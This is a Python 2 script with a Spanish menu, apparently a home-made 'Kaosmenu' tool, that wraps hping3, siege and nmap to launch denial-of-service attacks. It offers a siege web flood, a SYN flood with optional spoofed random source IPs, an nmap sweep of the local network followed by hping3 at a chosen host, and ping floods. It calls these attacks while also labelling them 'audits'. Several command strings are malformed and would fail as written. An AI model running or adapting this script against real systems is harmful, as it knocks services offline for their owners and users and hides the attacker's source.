# -*- coding:utf-8 -*-

import sys
import os

os.system("clear")

print "1) DoS web "
print "2) Ataques SYN Flood"
print "3) Ataques de negación de servicio a sistemas operativos "
print "4) Ataques DoS o DDoS simples con ping"
print "\n"
n = input("Kaosmenu >")

os.system("clear")

if n == 1:
   bots = raw_input("Escoge el numero de botnets >")
   t = raw_input("Escoge el tiempo que auditarás la web >")
   web = raw_input("Escoge el nombre de la web que auditarás >")
   os.system("clear")
   os.system('siege' + ' ' + '-c' + bots + ' ' + '-t' + t + ' ' + 'd1'+' ' + web )

if n == 2:
   web = raw_input("Escoge la web a que quieres auditar >")
   port = raw_input("Escoge el puerto por el que vas a atacar >")
   s = raw_input("Quieres que el algoritmo genere una IP falsa [S/N] >")

   if s == "S" or s == "s" or s == "SI" or s == "sí" or s == "si" or s == "SÍ":
      os.system("clear")
      os.system("hping3 --rand-source -p" + " " + port + "-S --flood" + " " + web) 

   if s == "N" or s == "n" or s == "NO" or s == "no" or s == "":
      os.system("clear")
      os.system("hping3 -p" + " " + port + "-S --flood" + " " + web)

if n == 3:
   s = raw_input("Quieres que que el script muestre un mapa de todas las IPs conectadas a la red local [S/N] >")
   
   if s == "S" or s == "s" or s == "SI" or s == "sí" or s == "si" or s == "SÍ":
      os.system("clear")
      os.system("nmap 192.168.1.*")
   
   if s == "N" or s == "n" or s == "NO" or s == "no" or s == "":
      print "OK"

   ip = raw_input("Ponga la IP que quiera atacar >")
   port = raw_input("Ponga el puerto a atacar >")
   os.system("clear")
   os.system("hping3 -p" + " " + port + " " + ip)


if n == 4:
   print "1) DoS o DDoS a sistemas operativos"
   print "2) DoS o DDoS a webs"
   print "\n"
   l = input("Kaosping >")   
   os.system("clear")
   if l == 1:
      s = raw_input("Quieres que el script muestre un mapa de todas las IPs conectadas a la red local [S\N] >")

      if s == "S" or s == "s" or s == "SI" or s == "sí" or s == "si" or s == "SÍ":
         os.system("clear")
         os.system("nmap 192.168.1.*")

      if s == "N" or s == "n" or s == "NO" or s == "no" or s == "":
         print "OK"

      print "\n"      
      ip = raw_input("Ponga la IP que quiera atacar >")
      os.system("clear")
      os.system("ping" + " " + ip)
  
   if l == 2:
      web = raw_input("Escoge la web a que quieres auditar >")
      os.system("clear")
      os.system("ping" + " " + web)


      



